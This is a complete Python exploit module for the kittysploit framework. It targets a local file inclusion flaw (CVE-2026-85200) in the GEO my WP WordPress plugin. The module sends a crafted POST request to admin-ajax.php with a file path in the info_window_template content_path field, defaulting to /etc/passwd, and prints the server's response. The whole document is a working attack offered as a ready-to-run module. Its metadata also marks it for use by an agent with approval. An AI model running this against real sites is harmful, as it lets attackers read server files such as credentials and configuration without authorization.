#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""GEO my WP CVE-2026-85200 — gmw_info_window_init content_path LFI."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "GEO my WP CVE-2026-85200 file read",
        "description": "Reads local files via form[info_window_template][content_path].",
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-85200"],
        "tags": ["wordpress", "geo-my-wp", "lfi", "cve-2026-85200"],
        "agent": {"approval_required": True},
    }

    path = OptString("/", "WordPress base path", required=False)
    file_path = OptString("/etc/passwd", "Absolute path on server", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        target = (self.file_path or "/etc/passwd").strip()
        resp = self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            data={
                "action": "gmw_info_window_init",
                "location[object_id]": "1",
                "location[location_id]": "1",
                "form[component]": "posts_locator",
                "form[prefix]": "pt",
                "form[info_window_template][content_path]": target,
            },
            allow_redirects=False,
        )
        body = resp.text or "" if resp else ""
        if resp and int(resp.status_code or 0) == 200 and body.strip():
            print_success(f"Inclusion response for {target}")
            print_status(body[:900])
            return True
        print_error("No readable content returned")
        return False
